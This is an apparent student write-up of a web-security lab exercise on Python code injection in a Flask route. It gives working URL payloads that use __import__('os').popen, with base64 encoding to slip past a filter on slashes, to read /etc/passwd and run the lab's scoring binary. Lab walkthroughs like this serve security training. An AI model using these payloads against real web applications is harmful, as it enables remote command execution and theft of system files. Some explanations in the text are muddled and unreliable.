Code Execution 08

This challenge is very similar to the previous challenge. The previous challenge allowed / in the path since the following Flask route was used:

@app.route('/hello/')

This challenge prevents / in the path since the following route is used:

@app.route('/hello/user')

This is obviously something you can only guess by trial and error. We can go back to the previous payload using ls and it will work. However, we can't run /usr/local/bin/score (since we need a /).

To bypass this issue, we can use base64 encoding. We will send a base64 encoded command to the server (to avoid the / in the path) and tell the server to decode it using the function b64decode. 
The call to b64decode will be done by the server as part of our payload. Unfortunately the base64 module is not loaded, so we will need to use the __import__ trick to load base64.
 Finally, the command to score will need to be base64-encoded before being sent to the server (so the payload can decode it).

 To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:
/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

 You can access this exercise using the following URL: http://ptc-32a42c10-87654e55.libcurl.so/. 
 You can also use the TLS version if you're experiencing timeouts due to network filtering: https://ptl-32a42c10-87654e55.libcurl.so/. 

Common Mistakes:

   * Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....

Steps: 
1) Visit the given url:  http://ptc-32a42c10-87654e55.libcurl.so/. 
2) Try with double quote (") this time we get Internal Server Error. But when we try with single quote it reflected.
  http://ptc-32a42c10-87654e55.libcurl.so/. hello/hacker"  [Now worked]
  http://ptc-32a42c10-87654e55.libcurl.so/. hello/hacker'  [Reflected]
3) Using some python string:
   https://ptl-32a42c10-87654e55.libcurl.so/hello/hacker"+str( _import_ ('os').popen('uname -a').read())+" [Wrong]
   https://ptl-32a42c10-87654e55.libcurl.so/hello/hacker"+str( __import__ ('os').popen('uname -a').read())+" [Correct]
   Difference is that in single underscore case(__), it won't works. we have to put underscore twice(__).
    Remind you that I once made such mistake. Lol,but I get it later myself.
4) Okay, then let's try to read etc/passwd using cat /etc/ passwd. 
    It seems: https://ptl-32a42c10-87654e55.libcurl.so/hello/hacker"+str(__import__('os').popen('cat /etc/passwd').read())+"
    It don't work because this site don't allow / in url. 

5)    For that we had to import from python as follows: 
    command line:
    str(__import__('os').popen(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dk')).read()) --> with url

6)  %2b = + 
    %22 = â€œ

7) Let's the url be encoded  cat '/etc/passwd'   to base 64 and then decoded in the payload.
    It's seems as:
      https://ptl-32a42c10-87654e55.libcurl.so/hello/hacker%22%2bstr(__import__('os').popen(__import__('base64').b64decode('Y2F0ICcvZXRjL3Bhc3N3ZCc=')).read())%2b%22   
8)    If we analyse deeper then we will find the first payload was not working because forward slash (/) was not allowed.
     Even double slash was working but only once so we need to use an approach where no forward slashes are executed first and in backend it can be used to bring the data we required. 
 
9)   Again let's replace the b64decode of cat /etc/passwd (Y2F0ICcvZXRjL3Bhc3N3ZCc=) with b64decode of /usr/local/bin/score (L3Vzci9sb2NhbC9iaW4vc2NvcmU=)
      It seems as: 
      https://ptl-32a42c10-87654e55.libcurl.so/hello/hacker%22%2bstr(__import__('os').popen(__import__('base64').b64decode('L3Vzci9sb2NhbC9iaW4vc2NvcmU=')).read())%2b%22 

    Then, after we encoded the /usr/local/bin/score sucessfully. Try to encode '/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8'
      --> L3Vzci9sb2NhbC9iaW4vc2NvcmUgZGQxOWIxYWEtN2E0OC00ODgxLTg3Y2UtNGZkM2Y5NjUxNmY4
    It's seems as: 
            https://ptl-32a42c10-87654e55.libcurl.so/hello/hacker%22%2bstr(__import__('os').popen(__import__('base64').b64decode('L3Vzci9sb2NhbC9iaW4vc2NvcmUgZGQxOWIxYWEtN2E0OC00ODgxLTg3Y2UtNGZkM2Y5NjUxNmY4')).read())%2b%22

10) Bravo!! Hello hackerExercise completed!! !

      Happy Hacking!! :) 